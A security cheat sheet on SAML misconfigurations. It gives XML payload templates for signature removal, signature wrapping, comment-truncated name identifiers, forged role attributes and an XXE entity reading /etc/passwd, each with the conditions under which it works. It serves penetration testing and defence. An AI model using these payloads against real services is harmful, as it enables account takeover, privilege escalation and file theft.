# SAML Misconfiguration

## Table of Contents

- [Account Takeover](#account-takeover)
- [Privilege Escalation](#privilege-escalation)
- [Chaining with XXE](#chaining-with-xxe)

## Account Takeover

### An assertion naming any user can be accepted, so the attacker signs in to the service as the victim without their credentials.

- Removing the signature [^1]
    ```xml
    <samlp:Response>
        <saml:Assertion>
            <!-- The <ds:Signature> element has been deleted -->
            <saml:Subject>
                <saml:NameID>[VICTIM-EMAIL]</saml:NameID>
            </saml:Subject>
        </saml:Assertion>
    </samlp:Response>
    ```

- Wrapping a signed assertion (XML Signature Wrapping) [^2]
    ```xml
    <samlp:Response>
        <saml:Assertion ID="_forged">
            <saml:Subject>
                <saml:NameID>[VICTIM-EMAIL]</saml:NameID>
            </saml:Subject>
        </saml:Assertion>
        <saml:Assertion ID="_original">
            <ds:Signature>
                <ds:SignedInfo>
                    <ds:Reference URI="#_original"/>
                </ds:SignedInfo>
            </ds:Signature>
            <saml:Subject>
                <saml:NameID>attacker@[ATTACKER-DOMAIN]</saml:NameID>
            </saml:Subject>
        </saml:Assertion>
    </samlp:Response>
    ```
    The signature check locates the element by its ID and finds it valid, while the application reads the first assertion in the document.

- Truncating the name identifier with a comment [^3]
    1. Email address the attacker registers at the identity provider
        ```text
        admin@[VULNERABLE-SERVICE].[ATTACKER-DOMAIN]
        ```

    2. Name identifier after the attacker edits the signed assertion
        ```xml
        <saml:NameID>admin@[VULNERABLE-SERVICE]<!---->.[ATTACKER-DOMAIN]</saml:NameID>
        ```
    The signature is computed over the text without comments, so it remains valid, but a library that reads only the first text node returns `admin@[VULNERABLE-SERVICE]`.
    - Duo Security, [Duo Finds SAML Vulnerabilities Affecting Multiple Implementations](https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations)

## Privilege Escalation

### Attributes that the service maps to roles or groups can be changed to grant permissions the user never had.

- Changing a role attribute
    ```xml
    <saml:AttributeStatement>
        <saml:Attribute Name="role">
            <saml:AttributeValue>admin</saml:AttributeValue>
        </saml:Attribute>
    </saml:AttributeStatement>
    ```
    Any of the signature bypasses above applies, without changing whose account is used.

## Chaining with XXE

### The response is parsed as XML before its signature is checked, so an unauthenticated user reaches an XML parser that may resolve external entities.

- Submitting an entity in the SAML response
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE samlp:Response [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <samlp:Response>
        <saml:Issuer>&xxe;</saml:Issuer>
    </samlp:Response>
    ```
    The response is base64-encoded and posted to the service's assertion consumer endpoint. The resulting impacts are described in [XXE](./XXE.md).

[^1]: Applies when the service verifies the signature only if one is present.
[^2]: Applies when the signature check and the code that reads the assertion locate it in different ways.
[^3]: Applies when the identity provider lets users register an arbitrary email address and the service provider's XML library returns only the first text node of an element.
